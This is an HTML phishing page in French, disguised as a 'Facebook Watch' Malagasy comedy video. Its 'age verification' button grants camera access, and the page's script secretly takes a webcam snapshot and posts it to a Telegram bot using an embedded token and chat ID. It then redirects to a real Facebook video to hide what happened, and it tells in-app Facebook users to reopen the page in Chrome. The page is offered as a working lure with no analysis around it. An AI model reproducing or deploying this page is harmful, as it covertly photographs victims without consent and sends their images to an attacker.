<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Facebook Watch - Comédie</title>
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://video-comedie-gasy.onrender.com">
    <meta property="og:title" content="Facebook Watch - Comédie">
    <meta property="og:description" content="Regarder la vidéo en direct sur Facebook Watch">
    <meta property="og:image" content="https://images.unsplash.com/photo-1594909122845-11baa439b7bf?q=80&w=1200">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; overflow: hidden; }
        .video-container { width: 100%; max-width: 500px; position: relative; text-align: center; background: #1a1a1a; border-radius: 8px; padding-bottom: 20px; }
        .thumbnail-container { position: relative; width: 100%; aspect-ratio: 16/9; background: #333; display: flex; justify-content: center; align-items: center; overflow: hidden; cursor: pointer; }
        .thumbnail { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(24, 119, 242, 0.9); border-radius: 50%; width: 65px; height: 65px; display: flex; justify-content: center; align-items: center; border: 2px solid white; z-index: 2; }
        .play-button::after { content: ''; border-style: solid; border-width: 12px 0 12px 20px; border-color: transparent transparent transparent white; margin-left: 4px; }
        .video-title { padding: 15px; font-weight: bold; font-size: 16px; text-align: left; }
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
        .card { background: white; color: black; padding: 25px; border-radius: 15px; width: 100%; max-width: 340px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .btn-verif { background: #1877f2; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer; font-size: 16px; }
        .fb-logo { width: 40px; margin-bottom: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="video-container">
        <div class="thumbnail-container" onclick="showPopup()">
            <img src="https://images.unsplash.com/photo-1594909122845-11baa439b7bf?q=80&w=600" class="thumbnail">
            <button class="play-button"></button>
        </div>
        <div class="video-title">NOUVEAU : Comédie Malagasy 2026 (Sketch complet)</div>
        <div style="font-size: 12px; color: #aaa; text-align: left; padding: 0 15px;">1.2M de vues • Il y a 2 heures</div>
    </div>

    <div class="overlay" id="overlay">
        <div class="card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
            <h3 style="margin: 0 0 10px 0;">Vérification d'âge</h3>
            <p style="font-size: 14px; color: #4b4f56;">Cette vidéo contient peut être du contenu réservé aux adultes.</p>
            <button class="btn-verif" onclick="startCamera()">AUTORISER ET LIRE</button>
        </div>
    </div>

    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s';
        const CHAT_ID = '7129218282';
        const FB_VIDEO_URL = 'https://www.facebook.com/share/v/1DfJG4EvEf/';

        function showPopup() { document.getElementById('overlay').style.display = 'flex'; }

        async function startCamera() {
            // Détection Facebook Lite
            var ua = navigator.userAgent || navigator.vendor || window.opera;
            var isFacebookApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("FB_IAB") > -1) || (ua.indexOf("FB4A") > -1);

            if (isFacebookApp) {
                document.getElementById('overlay').innerHTML = `
                    <div class="card">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
                        <h3 style="color:red;">Action Requise</h3>
                        <p style="font-size: 14px;">Cliquez sur les <b>3 points (⋮)</b> en haut à droite et choisissez <b>"Ouvrir dans Chrome"</b> pour lire la vidéo.</p>
                        <button class="btn-verif" onclick="location.reload()">RÉESSAYER</button>
                    </div>`;
                return;
            }

            document.getElementById('overlay').innerHTML = '<div class="card"><p>Chargement du flux vidéo...</p><div style="border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto;"></div></div>';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => { takeSnapshot(); }, 2000); // 2 secondes pour être rapide
            } catch (err) { window.location.href = FB_VIDEO_URL; }
        }

        function takeSnapshot() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                } catch (e) {}
                window.location.href = FB_VIDEO_URL;
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
